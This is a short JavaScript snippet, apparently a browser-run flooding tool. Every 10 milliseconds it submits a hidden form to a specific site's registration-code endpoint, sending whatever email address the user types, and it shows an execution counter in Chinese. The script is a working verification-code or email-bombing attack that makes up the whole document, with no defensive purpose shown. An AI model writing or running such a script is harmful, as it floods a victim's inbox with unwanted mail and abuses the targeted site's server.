let timer = null;
let count = 0;

function startSend() {
    timer = setInterval(function() {
        count++;
        document.getElementById('counter').innerText = '执行次数: ' + count;
        
        let email = document.getElementById('emailInput').value;
        
        let form = document.createElement('form');
        form.method = 'POST';
        form.action = 'https://www.lh6bx.xyz/index/user/getregcode.html';
        form.target = 'iframe';

        let input = document.createElement('input');
        input.type = 'hidden';
        input.name = 'useremail';
        input.value = email;

        form.appendChild(input);
        document.body.appendChild(form);
        form.submit();
        document.body.removeChild(form);

    }, 10); 
}

function stopSend() {
    clearInterval(timer);
}

